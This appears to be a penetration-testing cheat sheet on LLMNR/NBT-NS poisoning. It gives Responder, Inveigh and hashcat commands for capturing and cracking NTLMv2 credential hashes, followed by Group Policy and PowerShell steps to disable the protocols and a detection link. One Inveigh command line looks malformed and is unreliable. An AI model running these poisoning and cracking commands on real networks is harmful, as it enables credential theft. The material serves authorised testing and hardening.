
# LLMNR_NBT-NS_Poisoning

## Responder
```bash
sudo responder -I ens224 -wrf
# copythe hash in a file (user:hash), then crack it with hashcat
hashcat -m 5600 hash2.txt rockyou.txt
# 5600 for NTLM2
```
## Inveigh (for window)
```bash
https://github.com/Kevin-Robertson/Inveigh

.\Inveigh.ps1
#For an LLMNR and NBNS spoofing :
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

#To capture NTLMV2 :
.\Inveigh.ps1
press ESC
GET NTLMV2
```



___________________________________________________________________________________________
# How to secure equipment :
```bash
Disable LLMNR in Group Policy --> Administrative Templates --> Network --> DNS Client and enabling "Turn OFF Multicast Name Resolution."

# To disable NBT-NS :
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
```
Sometimes it's not possible to disable this protocoles, you can put some alertes, check this blog :
#https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/
```

